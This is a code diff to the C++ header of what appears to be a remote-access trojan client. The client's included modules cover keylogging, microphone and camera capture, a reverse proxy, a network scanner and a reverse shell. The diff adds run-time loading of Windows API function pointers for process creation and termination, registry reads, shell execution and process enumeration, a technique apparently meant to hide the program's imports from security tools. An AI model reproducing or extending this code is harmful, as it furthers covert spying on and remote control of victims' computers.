@@ -2,6 +2,8 @@
 #define _CLIENTE_H 1
 
 #include "headers.hpp"
+#include "custom_defines.hpp"
+#include "misc.hpp"
 #include "mod_mic.hpp"
 #include "mod_keylogger.hpp"
 #include "mod_camara.hpp"
@@ -11,6 +13,13 @@
 #include "mod_reverse_proxy.hpp"
 #include "mod_escaner.hpp"
 #include "mod_fun.hpp"
+
+typedef struct _WTS_PROCESS_INFOA {
+	DWORD SessionId;
+	DWORD ProcessId;
+	LPSTR pProcessName;
+	PSID  pUserSid;
+} WTS_PROCESS_INFOA, * PWTS_PROCESS_INFOA;
 
 struct Paquete {
 	u_int uiTipoPaquete;
@@ -33,6 +42,82 @@ struct Archivo_Descarga {
 		ssOutfile(nullptr), uTamArchivo(0), uDescargado(0){}
 
 	~Archivo_Descarga() = default;
+};
+
+//Structs para dynamic_load
+struct st_Kernel32 {
+	//GetComputerNameA
+	typedef BOOL(WINAPI* LPGETCOMPUTERNAMEA)(LPSTR, LPDWORD);
+	LPGETCOMPUTERNAMEA pGetComputerName = nullptr;
+
+	//GetNativeSystemInfo
+	typedef void(WINAPI* LPGETNATIVESYSTEMINFO)(LPSYSTEM_INFO);
+	LPGETNATIVESYSTEMINFO pGetNativeSystemInfo = nullptr;
+
+	//CreateProcessA
+	typedef BOOL(WINAPI* LPCREATEPROCESSA)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
+	LPCREATEPROCESSA pCreateProcessA = nullptr;
+
+	//OpenProcess
+	typedef HANDLE(WINAPI* LPOPENPROCESS)(DWORD, BOOL, DWORD); 
+	LPOPENPROCESS pOpenProcess = nullptr;
+
+	//TerminateProcess
+	typedef BOOL(WINAPI* LPTERMINATEPROCESS)(HANDLE, UINT);
+	LPTERMINATEPROCESS pTerminateProcess = nullptr;
+
+	//CloseHandle
+	typedef BOOL(WINAPI* LPCLOSEHANDLE)(HANDLE); 
+	LPCLOSEHANDLE pCloseHandle = nullptr;
+
+	//GlobalMemoryStatusEx
+	typedef BOOL(WINAPI* LPGLOBALMEMORYSTATUSEX)(LPMEMORYSTATUSEX);
+	LPGLOBALMEMORYSTATUSEX pGlobalMemoryStatusEx = nullptr;
+};
+
+struct st_Advapi32 {
+	//GetUserName
+	typedef BOOL(WINAPI* LPGETUSERNAMEA)(LPSTR, LPDWORD);
+	LPGETUSERNAMEA pGetUserName = nullptr;
+
+	//RegOpenKeyEx
+	typedef LSTATUS(WINAPI* LPREGOPENKEY)(HKEY, LPCSTR, DWORD, REGSAM, PHKEY); 
+	LPREGOPENKEY pRegOpenKeyEx = nullptr;
+
+	//RegQueryValueEx
+	typedef LSTATUS(WINAPI* LPREGQUERYVALUEEX)(HKEY, LPCSTR, LPDWORD, LPDWORD, LPBYTE, LPDWORD); 
+	LPREGQUERYVALUEEX pRegQueryValueEx = nullptr;
+
+	//RegCloseKey
+	typedef LSTATUS(WINAPI* LPREGCLOSEKEY)(HKEY); 
+	LPREGCLOSEKEY pRegCloseKey = nullptr;
+
+	//LookupAccountSidA
+	typedef BOOL(WINAPI* LPLOOKUPACCOUNTSIDA)(LPCSTR, PSID, LPSTR, LPDWORD, LPSTR, LPDWORD, PSID_NAME_USE);
+	LPLOOKUPACCOUNTSIDA pLookupAccountSidA = nullptr;
+};
+
+struct st_Shell32 {
+	//ShellExecuteExA
+	typedef BOOL(WINAPI* LPSHELLEXECUTEEXA)(SHELLEXECUTEINFOA*); 
+	LPSHELLEXECUTEEXA pShellExecuteExA = nullptr;
+};
+
+struct st_PsApi {
+	//GetModuleFileNameExA
+	typedef DWORD(WINAPI* LPGETMODULEFILNAMEEX)(HANDLE, HMODULE, LPSTR, DWORD);
+	LPGETMODULEFILNAMEEX pGetModuleFileNameExA = nullptr;
+};
+
+struct st_Wtsapi32 {
+	//WTSEnumerateProcessesA
+	typedef BOOL(WINAPI* LPWTSENUMERATEPROCESSES)(HANDLE, DWORD, DWORD, PWTS_PROCESS_INFOA*, DWORD*); 
+	LPWTSENUMERATEPROCESSES pWTSEnumerateProcessesA = nullptr;
+
+	//WTSFreeMemory
+	typedef void(WINAPI* LPWTSFREEMEMORY)(PVOID); 
+	LPWTSFREEMEMORY pWTSFreeMemory = nullptr;
+
 };
 
 class ReverseShell;
@@ -131,6 +216,19 @@ class Cliente {
 		//Kill switch
 		bool isKillSwitch();
 		void setKillSwitch(bool _valor);
+
+		//DLLs para dynamic_load
+		HMODULE hKernel32DLL = NULL;
+		HMODULE hAdvapi32DLL = NULL;
+		HMODULE hShell32DLL    = NULL;
+		HMODULE hWtsapi32DLL = NULL;
+		HMODULE hPsApiDLL = NULL;
+
+		st_Advapi32 ADVAPI32;
+		st_Shell32 SHELL32;
+		st_Kernel32 KERNEL32;
+		st_Wtsapi32 WTSAPI32;
+		st_PsApi PSAPI;
 
 		bool m_isRunning() {
 			std::unique_lock<std::mutex> lock(mtx_running);
